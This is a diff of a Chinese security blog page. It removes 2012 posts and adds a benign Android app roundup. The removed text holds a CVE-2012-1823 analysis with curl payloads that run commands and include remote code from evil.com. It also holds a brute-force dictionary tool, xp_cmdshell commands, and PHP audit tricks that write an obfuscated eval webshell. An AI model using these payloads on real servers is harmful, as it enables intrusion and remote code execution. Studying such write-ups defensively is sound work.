-11.phpinfo/highlight_file/show_source
-12.iconv/mb_convert_encoding[/code]
-附带php.ini中涉及安全配置选项。
-[code lang=&ldquo;php&rdquo;]safe_mode = off ( a lot of shit cannot be done with this on )
-disabled_functions = N/A ( no one,we want all )
-register_globals = on ( we can set variables by request )
-allow_url_include = on ( for lfi/rfi )
-allow_url_fopen = on ( for lfi/rfi )
-magic_quotes_gpc = off ( this will escape &lsquo; &ldquo;    and NUL&rsquo;s  with a backslash and we don&rsquo;t want that )
-short_tag_open = on ( some scripts are using short tags,better on )
-file_uploads = on ( we want to upload )
-display_errors = on ( we want to see the script errors,maybe some undeclared variables? )
-open_basedir 限制访问目录
-display_errors = off 显示错误信息[/code]</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/05/04/cve-2012-1823-analyse/">CVE-2012-1823 漏洞原理分析</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-05-04T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/05/04/cve-2012-1823-analyse/#comments">Comments</a>
+            | <a href="/2013/03/05/android_apps_and_learn_methods/#comments"留言</a>
         
       </p>
     
   </header>
 
 
-  <div class="entry-content"><p>首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
-1、php三种模式
-php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
-CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件，然后再把解释的结果以网页的形式返回给客户机,fork-and-execute 模式。
-DLL模式：Apache直接加载模块进行启动。
-FastCGI模式：FastCGI是cgi的升级版本，启动后一直运行，不需要每次都fork一次。</p>
+  <div class="entry-content"><p><a href="http://blog.ourren.com/blog/app.jpg"><img alt="移动应用" src="http://blog.ourren.com/blog/app.jpg" width="580" height="209"></a>
+      根据摩尔定律：每一美元所能买到的电脑性能，将每隔18个月翻两倍以上，由此可以看到科技更新的速度。同时移动互联网行业也不甘示弱，根据最近的数据显示国内移动终端已经突破4亿，可以想象这是一个多大的市场【1】。移动平台中Android、IOS与WP日益强大，而Symbian、BlackBerry份额逐渐萎缩，而ubuntu、firefox最近又推出移动平台，也想分得移动平台一杯羹（个人比较看好ubuntu）。</p>
 
-<p>2、整体流程
-在这个RCE中，触发的整体过程如下:
-用户提交的数据&mdash;>判定提交数据中是否有未编码的&#8217;=&lsquo;&ndash;(无)&ndash;>对该字符串进行解析&mdash;->转义元字符&mdash;->生成命令参数列表&mdash;->提交给CGI程序&mdash;->CGI进行处理。
-从CGI RFC的标准说起，原文：</p>
+<p>科技都在进步，博主不得不跟上时代发展，终于从Nokia转到Android，拥有一部android手机了。在近一个多月的时候和研究中发现一些比较好的应用，这些应用可以辅助个人学习或者丰富日常生活。因此不敢独享，分享给大家（再说这些应用基本上都是免费的，有义务推广下，激励开发者写出更好的应用）。在博文前面也有写个人平时的学习方法可以参考，详见（<a href="http://blog.ourren.com/2012/08/17/personal_learn_method_and_knowledge_manage.html">浅谈个人学习方法与知识管理</a>）。</p>
 
-<blockquote>4.4.  The Script Command Line
-
-Some systems support a method for supplying an array of strings to
-the CGI script.  This is only used in the case of an &#8216;indexed&#8217; HTTP
-query, which is identified by a &#8216;GET&#8217; or &#8216;HEAD&#8217; request with a URI
-query string that does not contain any unencoded &#8220;=&#8221; characters.  For
-such a request, the server SHOULD treat the query-string as a
-search-string and parse it into words, using the rules
-
-search-string = search-word *( &#8220;+&#8221; search-word )
-search-word   = 1*schar
-schar         = unreserved | escaped | xreserved
-xreserved     = &#8220;;&#8221; | &#8220;/&#8221; | &#8220;?&#8221; | &#8220;:&#8221; | &#8220;@&#8221; | &#8220;&&#8221; | &#8220;=&#8221; | &#8220;,&#8221; |
-&#8221;$&#8221;
-
-After parsing, each search-word is URL-decoded, optionally encoded in
-a system-defined manner and then added to the command line argument
-list.
-
-If the server cannot create any part of the argument list, then the
-server MUST NOT generate any command line information.  For example,
-the number of arguments may be greater than operating system or
-server limits, or one of the words may not be representable as an
-argument.
-
-The script SHOULD check to see if the QUERY_STRING value contains an
-unencoded &#8220;=&#8221; character, and SHOULD NOT use the command line
-arguments if it does.</blockquote>
+<ul>
+    <li>GTD计划类</li>
+</ul>
 
 
-<p>理解：
-一些系统为了让CGI程序获取查询参数。处理如下,只允许有索引的查询（比如说GET,HEAD，同时提交参数中不能有未编码的&#8217;=&lsquo;），成功的话服务端程序就需要把这个查询字符当做搜索字符，并解析为不同字符，并按照规则进行处理，例如：
-[code lang=&ldquo;php&rdquo;]      search-string = search-word <em>( &ldquo;+&rdquo; search-word )  //查询字符
-      search-word   = 1</em>schar                            //提交的字符
-      schar         = unreserved | escaped | xreserved    //解析后的结果
-      xreserved     = &ldquo;;&rdquo; | &ldquo;/&rdquo; | &ldquo;?&rdquo; | &ldquo;:&rdquo; | &ldquo;@&rdquo; | &ldquo;&amp;&rdquo; | &ldquo;=&rdquo; | &ldquo;,&rdquo; | &ldquo;$&rdquo;    //需要转义的字符[/code]
-通过解析后，就把这些字符添加到参数列表中。如果服务器不能创建参数列表，那么就不需要生成任何命令信息。同时如果查询参数中包含有未编码的&rsquo;=&lsquo;，那么就不用解析参数。
-通过对Apache处理CGI RFC中发现，如果查询字符中未包含未编码的&rsquo;=&lsquo;，那么字符就会用&rsquo;+&lsquo;(编码的空格)符号进行分割，然后进行元字符转义，最后传递给CGI程序。
-但是不幸的是，PHP开发者忘记了RFC这部分内容，在2004年移除了这部分与其他地方冲突的代码，原文如下：</p>
+<p><a href="http://doit.im">Doit.im</a>/<a href="http://any.do">Any.do</a></p>
 
-<blockquote>From: Rasmus Lerdorf <rasmus <at> lerdorf.com>
-Subject: [PHP-DEV] php-cgi command line switch memory check
-Newsgroups: gmane.comp.php.devel
-Date: 2004-02-04 23:26:41 GMT (7 years, 49 weeks, 3 days, 20 hours and 39 minutes ago)
+<p>用于个人的日程安排与提醒，记录平时Idea与个人计划。功能方面差不多，前者免费版有限制，后者则是完全免费的。由于个人手机系统使用any.do会造成死机，暂时使用前者作为计划类应用。</p>
 
-In our SAPI cgi we have a check along these lines:
-
-if (getenv(&#8220;SERVER_SOFTWARE&#8221;)
-|| getenv(&#8220;SERVER_NAME&#8221;)
-|| getenv(&#8220;GATEWAY_INTERFACE&#8221;)
-|| getenv(&#8220;REQUEST_METHOD&#8221;)) {
-cgi = 1;
-}
-//在这里进行判定，如果CGI程序运行在网络环境中，不对提交的参数进行解析，这样是没有漏洞的，但是由于某些原因进行了移除。
-
-if(!cgi) getopt(&#8230;)
-
-As in, we do not parse command line args for the cgi binary if we are
-running in a web context.  At the same time our regression testing system
-tries to use the cgi binary and it sets these variables in order to
-properly test GET/POST requests.  From the regression testing system we
-use -d extensively to override ini settings to make sure our test
-environment is sane.  Of course these two ideas conflict, so currently our
-regression testing is somewhat broken.  We haven&#8217;t noticed because we
-don&#8217;t have many tests that have GET/POST data and we rarely build the cgi
-binary.</blockquote>
+<ul>
+    <li>资讯类</li>
+</ul>
 
 
-<p>3、利用
-查看php-cgi.exe的参数。
--s               Display colour syntax highlighted source.
--d foo[=bar]     Define INI entry foo with value &lsquo;bar&rsquo;
--n               No php.ini file will be used
-导致的漏洞可以源码泄漏，本地包含和远程包含，copy GaRY的利用代码。
-(1)本地包含直接执行代码:
-curl -H &ldquo;USER-AGENT: &lt;?system(&lsquo;id&rsquo;);die();?>&rdquo; <a href="http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n">http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n</a></p>
+<p><a href="http://yuedu.163.com/">网易云阅读</a>/<a href="http://www.myzaker.com/">Zaker</a></p>
 
-<p>(2)远程包含执行代码:
-curl <a href="http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt">http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a></p>
+<p>两者功能和界面基本上都一样，主要用于WIFI离线阅读，然后业余空闲时间或者坐车时浏览，感觉不错的可以收藏然后WEB方式浏览。内容包含以下几类：新闻资讯（新闻头条、南方周刊等）、技术资讯（cnbeta、36kr、虎嗅、爱范儿等）、技术讨论（知乎每日精选等）。</p>
 
-<p>(3)查看源码
-<a href="http://target.com/test.php?-s">http://target.com/test.php?-s</a>
-自己看了下php5中的php-cgi.exe貌似没有-r参数。</p>
-
-<p>4、参考：
-<a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a>
-<a href="http://zone.wooyun.org/content/151">http://zone.wooyun.org/content/151</a></p>
-</div>
-  
-  
+<ul>
+    <li>技术类</li>
+</ul>
 
 
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/04/18/sdgt_brute_dic_tool/">Sdgt Project简介</a></h1>
-    
-    
-      <p class="meta">
-        
+<p>     <a href="https://play.google.com/store/apps/details?id=com.noinnion.android.greader.readerpro&hl=zh_CN">gReader Pro</a> + <a href="http://getpocket.com/">Pocket</a></p>
+
+<p>这里强烈推荐下gReader，作为GR阅读的Android客户端，绝对符合你的胃口，满足你的需求。可以实现离线阅读（自动优化网页阅读效果），并支持加星同步。</p>
+
+<p>Pocket则用于在平时上网中看到不错的网址或者文章，用Pocket Chrome插件收藏，然后利用WIFI同步到手机端。这里之所以推荐Pocket，是因为一些需要翻墙的网页也可以离线。</p>
+
+<ul style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;">
+    <li>书籍类</li>
+</ul>
 
 
+<p><a href="http://www.duokan.com/">多看</a>/<a href="http://www.zhangyue.com/">iReader</a> + <a href="http://www.ireadercity.com/">书香云集</a></p>
+
+<p>用于阅读一些个人传记、生活鸡汤、历史等。特别推荐书香云集，不为别的，<em>只因为盗版书多多，试试就知道</em>。</p>
+
+<ul>
+    <li><span style="line-height: 13px;">笔记类</span></li>
+</ul>
 
 
-<time class='entry-date' datetime='2012-04-18T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/04/18/sdgt_brute_dic_tool/#comments">Comments</a>
-        
-      </p>
-    
-  </header>
+<p><a href="http://www.evernote.com/">Evernote</a>/<a href="http://note.youdao.com/">有道云笔记</a></p>
 
+<p>用于书写文章，管理优质文章，或者写点小东西同步使用。</p>
 
-  <div class="entry-content"><p>1、关于
-Sdgt(social dictionary generate tool)通过收集到的敏感信息，结合国人密码心理学，实现了一个简单的密码生成工具，可以在暴力破解方面使用。
-2、配置
-文件采用UTF8编码，template.txt中收集中csdn中top1000密码，可以把template.txt复制进行修改。每行&#8221;:&ldquo;前面是密码因子，后面的部分是值并用分号隔开，例如：
-name:zhang san;li si
-qq:10000;10010
-idcard:100121190000111234
-subpw:123qaz;qaz
-nickname:boy;good;sec
-year:2012;2011;2010
-domain:sina;google
-3、使用
-sdgt.py  C:zhang.txt C:zhangdic.txt
-4、规则
-结合国人密码学，采用了如下的一些规则。
-<a href="http://blog.ourren.com/blog/sdgt.png"><img class="aligncenter" title="sdgt" src="http://blog.ourren.com/blog/sdgt.png" alt="" width="410" height="315"></a></p>
-</div>
-  
-  
+<p><em><strong>学习方法</strong></em></p>
 
+<p><em>      因此总的说来，主要是利用WIFI离线功能，提取有用资料；然后善于将碎片时间利用起来学习，达到有效地利用时间。</em></p>
 
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/04/16/some_of_statistical_sql/">数据统计的一些语句</a></h1>
-    
-    
-      <p class="meta">
-        
+<p><em>参考</em></p>
 
+<ol>
+    <li>第31次中国互联网络发展状况统计报告：http://www.cnnic.cn/hlwfzyj/hlwxzbg/hlwtjbg/201301/P020130122600399530412.pdf</li>
+</ol>
 
-
-
-<time class='entry-date' datetime='2012-04-16T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/04/16/some_of_statistical_sql/#comments">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>数据库结构
-[code lang=&ldquo;sql&rdquo;]
-mysql&gt; describe users;
-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;-+
-| Field    | Type     | Null | Key | Default | Extra |
-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;-+
-| username | char(30) | NO   | MUL | NULL    |       |
-| password | char(30) | NO   | MUL | NULL    |       |
-| email    | char(30) | NO   | MUL | NULL    |       |
-+&mdash;&mdash;&mdash;-+&mdash;&mdash;&mdash;-+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;-+
-[/code]
-统计相同password个数并降序：
-[code lang=&ldquo;sql&rdquo;]SELECT password,count(*) as num FROM <code>users</code> group by password order by num DESC;[/code]</p>
-
-<p>统计相同password个数并降序，把前100项导出为excel
-[code lang=&ldquo;sql&rdquo;]SELECT password,count(*) as num  into outfile &lsquo;top100.xls&rsquo; FROM <code>users</code> group by password order by num DESC limit 0,100;[/code]</p>
-
-<p>附：
-mssql导出数据为excel
-[code lang=&ldquo;sql&rdquo;]EXEC master..xp_cmdshell &lsquo;bcp tt.dbo.user out D:data.xls -c -q -S &ldquo;localhost&rdquo; -U &ldquo;sa&rdquo; -P &ldquo;123456&rdquo;&rsquo;[/code]
-mssql删除文件
-[code lang=&ldquo;sql&rdquo;]EXEC master..xp_cmdshell &lsquo;del D:data.xls&rsquo;[/code]</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2012/04/16/some_of_php_audit_skills/">一些php源码审计与利用技巧</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-04-16T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2012/04/16/some_of_php_audit_skills/#comments">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>花了一些时间翻阅了wolvez中源码审计帖子，发现里面很多关于文件包含的漏洞，当然还有很多高级利用帖子。总体来说又扩充了一下关于php漏洞挖掘方面的思路，先总结如下：</p>
-
-<p>1、文件包含
-原来有介绍文件包含（<a href="http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/blog/file-contains-the-summary-into-the-use-of.html</a> ），其实当时候总结的还不是很全，还有几点需要补充的。
-查找思路：先找到哪些文件中include，require函数中包含有可控制的变量，然后看哪些文件包含了这个文件。
-利用：
-条件：在allow_url_include = On且PHP >= 5.2.0的条件下
-利用的时候采用data://或者php://input是一个不错的选择
-[code lang=&ldquo;php&rdquo;]x.php?path=data://text/plain;base64,PD9waHBpbmZvKCk7Lyo=
-x.php?path=data:;base64,PD9waHBpbmZvKCk7Lyo=
-x.php?inc=data:;base64,PD9waHAgZWNobyBwaHBpbmZvKCk7Pz4=   //phpinfo()[/code]
-截断方式：
-%00(GPC开启时会转义)  长文件名（///////)
-注：php5.3.4以后已经修复了%00漏洞</p>
-
-<p>包含tmp文件夹下文件：
-注上传一个webshell到/tmp文件夹下包含（../../../x.php）。</p>
-
-<p>2、变量覆盖
-条件：需要开启register_globals（php5.4已删除，见此文<a href="http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html">http://blog.ourren.com/2012/03/13/php5.4_remove_safe-function.html</a> ），有时候还可能会考虑GPC。
-数组未初始化覆盖技巧蛮多的。
-新认识的函数：parse_str</p>
-
-<p>3、注入关键字过滤
-&lsquo;    %2%277  过滤%27时，针对str_replace过滤关键字符，其他过滤方式结合具体情况
-&#8216;    %2527  针对urldecode()函数
-空格  ()替代空格的方法绕过：union(select(password),2,3,4,5,6,7,8,9,0,1+from+[zt_admin])</p>
-
-<p>4、文件写操作
-两种比较好的利用代码：
-字符写文件
-[code lang=&ldquo;php&rdquo;]hxxp://www.xxx.com/error.php?errid=1&amp;errtitle=&lt;?fputs(fopen(chr(119).chr(111).chr(108).chr(118).chr(101).chr(122).chr(46).
-chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(112).chr(104).
-chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59).chr(63).chr(62));?&gt;[/code]
-这样你在访问一次hxxp://www.xxx.com/data/error.php 后将得到 hxxp://www.xxx.com/data/wolvez.php 的测试文件
-内容为&lt;?phpinfo():?>l</p>
-
-<p>双引号（base64）写文件，然后包含执行
-<a href="http://$">http://$</a>{${fputs(fopen(base64_decode(ZmwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9Q
-T1NUW2FdKTsgPz4x))}}
-上面这段代码是将 &lt;?php @eval($_POST[a]); ?>1 到fl.php文件。利用base64_encode编码避免了使用单引号，所以无须考虑gpc的影响。注意，在字符串不包括 + =等特殊符号的情况下，base64_decode的参数是无须使用单引号或者双银引号的。</p>
-
-<p>5、GPC绕过
-$_SERVER数组不受GPC影响。
-GPC与substr组合：有些地方经过GPC转义后，其他地方有可能用substr进行取值，这时候恰好把&#8217;&lsquo;去掉。
-数据库（文本）中转：
-[code lang=&ldquo;php&rdquo;][注意存入数据库和select出的数据]
-用户输入===&gt;gpcaddslashes()==========&gt;数据库=========&gt;执行sql语句include写入缓存文件
-insertupdate                 select
-编码：
-UTF-7(+ACc-)===&gt;gpcaddslashes()===&gt;mb_convert_encoding()===&gt;UTF-8(&rsquo;)
-0xbf27===&gt;gpcaddslashes()===&gt;0xbf5c27===&gt;执行sql语句[数据库编码支持多字节][/code]
-参考：
-<a href="http://bbs.wolvez.org/viewtopic.php?id=20">http://bbs.wolvez.org/viewtopic.php?id=20</a>
-<a href="http://www.xfocus.net/articles/200608/878.html">http://www.xfocus.net/articles/200608/878.html</a>
-<a href="http://www.ourren.com/file-contains-the-summary-into-the-use-of.html">http://www.ourren.com/file-contains-the-summary-into-the-use-of.html</a>
-<a href="http://bbs.wolvez.org">http://bbs.wolvez.org</a></p>
 </div>
   
   
